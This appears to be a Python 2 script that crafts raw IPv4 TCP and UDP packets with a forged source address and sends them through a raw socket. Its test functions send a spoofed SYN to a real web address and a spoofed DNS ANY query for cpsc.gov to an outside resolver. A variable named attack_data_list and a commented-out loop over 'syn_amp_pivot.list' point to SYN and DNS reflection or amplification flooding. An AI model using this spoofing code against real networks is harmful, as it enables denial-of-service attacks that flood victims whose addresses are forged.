#coding: utf-8

import os, sys
import time
import socket
import struct
import itertools
import traceback


class IpParser(object):
    def checksum(self, msg):
        s = 0
        i = 0
        while i < len(msg):
            w = ord(msg[i])
            if i+1 < len(msg):
                w += (ord(msg[i+1]) << 8)
            s = s + w
            i += 2
        s = (s>>16) + (s & 0xffff);
        s = s + (s >> 16);
        s = ~s & 0xffff
        return s
 
    def __init__(self):
        self.sip = socket.gethostbyname(socket.gethostname())
        self.dip = ''

        self.ip_ihl = 5
        self.ip_ver = 4
        self.ip_tos = 0

        self.ip_tot_len = 0  # kernel will fill the correct total length
        self.ip_id = 0       # id of this packet
        self.ip_frag_off = 0
        self.ip_ttl = 64
        self.ip_check = 0    # kernel will fill the correct checksum

    def ip_header(self):
        ip_saddr = socket.inet_aton(self.sip)
        ip_daddr = socket.inet_aton(self.dip)
        ip_ihl_ver = (self.ip_ver << 4) + self.ip_ihl
        # the ! in the pack format string means network order
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            self.ip_tos,
            self.ip_tot_len,
            self.ip_id,
            self.ip_frag_off,
            self.ip_ttl,
            self.ip_proto,
            self.ip_check,
            ip_saddr,
            ip_daddr
        )
        return ip_header

    def parse(self, s):
        pass


class UdpParser(IpParser):
    ip_proto = socket.IPPROTO_UDP

    def __init__(self):
        super(UdpParser, self).__init__()

        self.sport = 0
        self.dport = 0

        self.user_data = ''

    def udp_header(self):
        sip = socket.inet_aton(self.sip)
        dip = socket.inet_aton(self.dip)
        placeholder = 0
        udp_length = 8
        udp_check = 0
        # Ethernet IEEE 802.3 Frame Format / Structure
        if len(self.user_data) < 18:
            self.user_data += chr(126) * (18 - len(self.user_data))
        udp_header = struct.pack('!HHHH', self.sport, self.dport, udp_length, udp_check)
        psh = struct.pack('!4s4sBBH', sip, dip, placeholder, self.ip_proto, udp_length);
        psh = psh + udp_header + self.user_data;
        udp_check = self.checksum(psh)
        udp_length = len(udp_header) + len(self.user_data)
        udp_header = struct.pack('!HHH', self.sport, self.dport, udp_length
            ) + struct.pack('H', udp_check)
        return udp_header
 
    def packet(self):
        packet = self.ip_header() + self.udp_header() + self.user_data
        return packet


class TcpParser(IpParser):
    ip_proto = socket.IPPROTO_TCP

    def __init__(self):
        super(TcpParser, self).__init__()

        self.sport = 0
        self.dport = 0
        self.tcp_seq = 0
        self.tcp_ack_seq = 0
        self.tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        self.tcp_fin = 0
        self.tcp_syn = 0
        self.tcp_rst = 0
        self.tcp_psh = 0
        self.tcp_ack = 0
        self.tcp_urg = 0
        self.tcp_window = socket.htons(5840) # maximum allowed window size
        self.tcp_offset_res = (self.tcp_doff << 4) + 0

        self.user_data = "" 

    def parse(self, msg):
        pass

    def tcp_header(self):
        tcp_flags = (self.tcp_fin 
             + (self.tcp_syn << 1)
             + (self.tcp_rst << 2)
             + (self.tcp_psh << 3)
             + (self.tcp_ack << 4)
             + (self.tcp_urg << 5)
        )
        sip = socket.inet_aton(self.sip)
        dip = socket.inet_aton(self.dip)
        placeholder = 0
        tcp_check = 0
        tcp_urg_ptr = 0
        # tcp_header without checksum
        tcp_header = struct.pack('!HHLLBBHHH', self.sport, self.dport,
            self.tcp_seq, self.tcp_ack_seq, self.tcp_offset_res,
            tcp_flags, self.tcp_window,
            tcp_check, tcp_urg_ptr
        )
        tcp_length = len(tcp_header) + len(self.user_data)
        psh = struct.pack('!4s4sBBH' , sip, dip, placeholder, self.ip_proto, tcp_length);
        psh = psh + tcp_header + self.user_data;
        tcp_check = self.checksum(psh)
        # tcp_header with checksum
        tcp_header = struct.pack('!HHLLBBH', self.sport, self.dport,
            self.tcp_seq, self.tcp_ack_seq, self.tcp_offset_res,
            tcp_flags, self.tcp_window
            ) + struct.pack('H', tcp_check
            ) + struct.pack('!H', tcp_urg_ptr)
        return tcp_header
 
    def packet(self):
        packet = self.ip_header() + self.tcp_header() + self.user_data
        return packet


def tcp_test(sock):
    dip = socket.gethostbyname("baidu.com")
    dip = "111.206.60.115"
    dport = 80
    try:
        T = TcpParser()
        T.sip = '111.206.60.114'
        T.sport = 15534
        T.dip = dip
        T.dport = dport
        T.tcp_syn = 1
        T.user_data = "test"
        d = T.packet()
        print "%s:%s\t->\t%s:%s\t%s\t%s"%(T.sip, T.sport, T.dip, T.dport, len(d), repr(d))

        attack_data_list = []
        attack_data_list.append(d)
        #for host in open('syn_amp_pivot.list').readlines():
        #    dip = host.strip()
        #    for dport in [80, 443]:
        #        T.dip = dip
        #        T.dport = dport
        #        d = T.packet()
        #        attack_data_list.append(d)
        #        print "%s:%s\t->\t%s:%s\t%s"%(T.sip, T.sport, T.dip, T.dport, len(T.user_data))
        for i in range(1):
            for d in attack_data_list:
                print "Send: %s"%sock.sendto(d, (dip, dport))
    except Exception, e:
        print traceback.format_exc()


def get_dns_query_from_tcpdump(s):
    s = '''
0x0000:  4500 0037 78d1 0000 4011 9e70 0a10 1437  E..7x...@..p...7
0x0010:  6a27 db06 a205 0035 0023 63a9 bcb5 0100  j'.....5.#c.....
0x0020:  0001 0000 0000 0000 0562 6169 6475 0363  .........baidu.c
0x0030:  6f6d 0000 0100 01                        om.....
'''
    s = '''
0x0000:  4500 0036 3245 0000 4011 17ab 0a10 1437  E..62E..@......7
0x0010:  ca73 480d e772 0035 0022 30fb a0e5 0100  .sH..r.5."0.....
0x0020:  0001 0000 0000 0000 0463 7073 6303 676f  .........cpsc.go
0x0030:  7600 00ff 0001                           v.....
'''
    com_list = [l.split()[1:-1] for l in s.splitlines() if l.strip()]
    com_strs = ''.join([''.join(i) for i in com_list])[56:] # ip head 20 + udp head 8
    d = ''
    for i in range(0, len(com_strs), 2):
        d += chr(int(com_strs[i:i+2], 16))
    return d


def udp_test(sock):
    dip = "106.39.219.6"
    dip = '202.115.72.13'
    dport = 53
    #dip = '127.0.0.1'
    #dport = 53 
    try:
        U = UdpParser()
        U.sip = '111.206.60.114'
        U.sport = 25534
        U.dip = dip
        U.dport = dport
        U.user_data = get_dns_query_from_tcpdump('')
        d = U.packet()
        print "%s:%s\t->\t%s:%s\t%s\t%s"%(U.sip, U.sport, U.dip, U.dport, len(d), repr(d))
        print "Send: %s"%sock.sendto(d, (dip, dport))
    except Exception, e:
        print traceback.format_exc()


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    # tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
    #sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    #tcp_test(sock)
    udp_test(sock)
 

